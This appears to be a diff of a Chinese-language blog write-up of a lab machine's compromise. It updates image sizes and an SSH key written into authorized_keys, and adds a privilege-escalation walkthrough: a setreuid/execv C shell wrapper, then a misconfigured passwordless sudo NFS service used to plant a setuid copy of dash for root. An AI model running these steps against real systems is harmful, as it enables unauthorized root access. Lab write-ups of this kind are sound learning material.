@@ -8339,7 +8339,7 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595206330063-9931c990-b98b-4383-add5-9cbf8057ae8c.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=845&size=157017&status=done&style=none&width=561" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595206330063-9931c990-b98b-4383-add5-9cbf8057ae8c.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=845&size=157017&status=done&style=none&width=561" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
@@ -8387,13 +8387,13 @@
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213247305-be334672-84bb-4ea1-9c20-d349ce1d040e.png#align=left&display=inline&height=449&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=813&size=294769&status=done&style=none&width=564" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213247305-be334672-84bb-4ea1-9c20-d349ce1d040e.png#align=left&display=inline&height=448&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=813&size=294769&status=done&style=none&width=564" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
 
 <p>把 wsl 的公钥写到 .ssh/authorized_keys 方便一点</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyab46KTnUD6PBqNHweAB+SfDl36waT1RpkBUB3rcmP7QhRk4EOh0yShEmGCA2fev&#x2F;A&#x2F;9BY2LP2nd4EplGNYn14OgHONtXH74fSCqf0QZGMexQ9BkV5pHOTW+nGapxeaUTzyEkQQvDLnLm05Oqx6F9d5pfHIrbfQLBK7J0zY1BpkflT3I8pBzEdzLCWoG4Z62WGKQ0Q0ldm9NkRoEbZSOUxneazHiVa89mORtdtHXRr3nseLOyN17rJh6c2CF8ZtlLHIp12GOl0A6qm0eFW4KSJJvZCdxhX&#x2F;p83hfCclFw7dckX1n+Q45GjuUF&#x2F;ZE8IXmKRkwNDxOZalSgFjyYX+RlMr95Ruv8IaMk8tv5+Ut04cquKUgCn&#x2F;9ksLRyL7+fJFok1EEupo4ZjTx3DlBNdkSch3IPT1XVgZeapqUik7jt5DgeGmGKBF93kE9pLO+2+3l1KntdeZ3abJHXDWzX6&#x2F;mqRNtvMzdVik0jQGOjnGz1Yck0z9w8BK8BGtZ+917Kvns&#x3D; 1097179511@qq.com&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMDV3SQ2tLqh01eS1eVsHlKcPTdtGjk3qw8D90P8kwu2XzH2pne++Lw2hYPT3YBihSu8q+ATpAQw6lhO6v99MIHT1APFkVXRMXanb87ltvXUVc5sIOZsfr7Cjsnh4o+oj2EYciDwaAIlhBy1lgvpPgK+NDp7ALPuCeOTn85Rd017RrbDo0FdS0Cy4wjqhQ7vijrppglTy1UDC2QvjNIFiPZEdxBVb3RqkkhXe420cQ0ImqOIrIhEMnxctKgCvl8&#x2F;r5s8b6sfasUJMCs90Hpus9do5pWuDzaJQ7hbDBO&#x2F;DfAQqOh8u0OVYEuODRk3gd36PsnTOiwry36mJmDlBd0j2mcifOv9cBsasmruiPOZVHwaYAqbimo8dNSOxt0rzNcv&#x2F;EXF2IAVc+EeAVdM8C9SWkVYXAK&#x2F;L3rCVQct3otBDN4N7DNx6tyqgKFc6P8orceeu8shLem2fOSND65uZqlYQC7+blO4KC9NJAJ0T6ix5FxUUiuRwafXXmFvoV661LS78&#x3D; root@yichen&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -8485,11 +8485,36 @@
                 <div class="image-caption">image.png</div>
             </figure>
 
-<p>还是把 wsl 的公钥复制上去</p>
+<p>但是 id 看一下还是 mike，要交换一下 uid 和 euid</p>
+<p>mike 编译，用 john 用户运行</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  setreuid(geteuid(), getuid());</span><br><span class="line">  execv(<span class="string">"/bin/bash"</span>, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <figure class="image-bubble">
                 <div class="img-lightbox">
                     <div class="overlay"></div>
-                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595221766319-05e9f712-fbec-4f43-9367-8d723df88648.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=1483&size=447970&status=done&style=none&width=741.5" alt="image.png" title="">
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595231433792-400b3387-535d-4735-be8c-c9fd179e04c4.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=image.png&originHeight=276&originWidth=750&size=48695&status=done&style=none&width=497" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>sudo -l 发现 nfs 不用密码就可以以 root 权限执行</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595231487392-f76080fe-b324-4b0f-a407-702850256a0c.png#align=left&display=inline&height=87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=129&originWidth=929&size=25582&status=done&style=none&width=628" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>启动：<code>sudo /usr/local/sbin/nfs start</code><br>然后在攻击机上创建一个用来挂载的文件夹<br><code>mkdir /mnt/pegasus</code><br>然后挂载上<br><code>mount -t nfs -o proto=tcp,port=2049 192.168.149.183:/opt/nfs /mnt/pegasus</code></p>
+<p>创建一个文件并且给他权限<br><code>touch /mnt/pegasus/hack_shell</code><br><code>chmod 777 /mnt/pegasus/hack_shell</code></p>
+<p>回到靶机，把 /bin/dash 拷过去<br><code>cp /bin/dash /opt/nfs/hack_shell</code></p>
+<p>然后在攻击机上给他权限<br><code>chmod u+s /mnt/pegasus/hack_shell</code><br><code>chmod g+s /mnt/pegasus/hack_shell</code></p>
+<p>这样在靶机一执行，就能拿到 root 权限</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595232297914-2e5e212d-aa4c-4146-9b3d-20fed1f88eb9.png#align=left&display=inline&height=474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=683&originWidth=802&size=88682&status=done&style=none&width=556" alt="image.png" title="">
                 </div>
                 <div class="image-caption">image.png</div>
             </figure>
